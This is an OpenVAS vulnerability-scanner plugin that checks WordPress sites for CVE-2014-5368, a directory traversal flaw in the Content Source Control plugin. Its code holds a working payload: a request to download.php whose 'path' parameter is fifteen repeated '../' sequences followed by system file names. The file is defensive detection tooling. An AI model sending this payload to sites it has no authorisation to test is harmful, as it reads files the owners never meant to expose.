###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_source_control_dir_trav_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress Content Source Control Plugin Directory Traversal Vulnerability
#
# Authors:
# Deepmala <kdeepmala@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804904");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-5368");
  script_bugtraq_id(69278);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-09-19 10:28:34 +0530 (Fri, 19 Sep 2014)");
  script_name("WordPress Content Source Control Plugin Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WordPress
  Content Source Control plugin and is prone to directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file");

  script_tag(name:"insight", value:"Input passed via the 'path' parameter
  to download.php script is not properly sanitized before being returned
  to the user");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"WordPress Content Source Control plugin
  version 3.0.0 and earlier.");

  script_tag(name:"solution", value:"Upgrade to version 3.1.0 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q3/407");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/95374");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/wp-source-control");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + "/wp-content/plugins/wp-source-control/downloadfiles/download"
            + ".php?path=" + crap(data:"../",length:3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    security_message(port:http_port);
    exit(0);
  }
}
